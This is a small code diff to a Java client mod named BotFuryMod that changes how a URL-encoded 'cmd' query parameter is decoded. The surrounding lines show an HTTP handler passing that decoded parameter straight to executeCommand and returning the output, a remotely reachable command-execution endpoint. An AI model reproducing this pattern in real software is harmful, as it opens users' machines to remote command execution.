@@ -64,7 +64,7 @@ public class BotFuryMod implements ClientModInitializer {
             for (String param : query.split("&")) {
                 String[] kv = param.split("=");
                 if (kv.length == 2 && kv[0].equals("cmd")) {
-                    String decodedCmd = URLDecoder.decode(kv[1], StandardCharsets.UTF_8.toString());
+                    String decodedCmd = URLDecoder.decode(kv[1], StandardCharsets.UTF_8.name());
                     response = executeCommand(decodedCmd);
                 }
             }
